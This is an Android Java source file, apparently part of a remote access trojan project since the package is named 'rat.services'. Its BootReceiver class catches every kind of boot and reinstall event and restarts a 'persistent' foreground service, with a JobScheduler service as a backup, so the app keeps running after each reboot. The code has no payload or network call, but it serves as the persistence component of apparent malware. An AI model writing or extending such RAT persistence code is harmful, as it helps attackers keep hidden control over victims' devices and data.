package com.fly0rakoon.rat.services;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

public class BootReceiver extends BroadcastReceiver {
    
    private static final String TAG = "BootReceiver";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        Log.d(TAG, "Received broadcast: " + action);

        // Check for all boot events
        if (Intent.ACTION_BOOT_COMPLETED.equals(action) || 
            Intent.ACTION_REBOOT.equals(action) ||
            Intent.ACTION_LOCKED_BOOT_COMPLETED.equals(action) ||
            Intent.ACTION_MY_PACKAGE_REPLACED.equals(action) ||
            "android.intent.action.QUICKBOOT_POWERON".equals(action)) {

            Log.d(TAG, "Boot detected, starting services...");
            
            // Start foreground service
            startForegroundService(context);
            
            // Also start JobScheduler as backup
            startJobScheduler(context);
        }
    }
    
    private void startForegroundService(Context context) {
        Intent serviceIntent = new Intent(context, ForegroundService.class);
        serviceIntent.setAction("START_PERSISTENT_SERVICE");

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
                Log.d(TAG, "Started foreground service (Android O+)");
            } else {
                context.startService(serviceIntent);
                Log.d(TAG, "Started service (pre-Android O)");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting service after boot: " + e.getMessage());
        }
    }
    
    private void startJobScheduler(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                Intent jobIntent = new Intent(context, JobSchedulerService.class);
                context.startService(jobIntent);
                Log.d(TAG, "Started JobScheduler service");
            } catch (Exception e) {
                Log.e(TAG, "Failed to start JobScheduler: " + e.getMessage());
            }
        }
    }
}
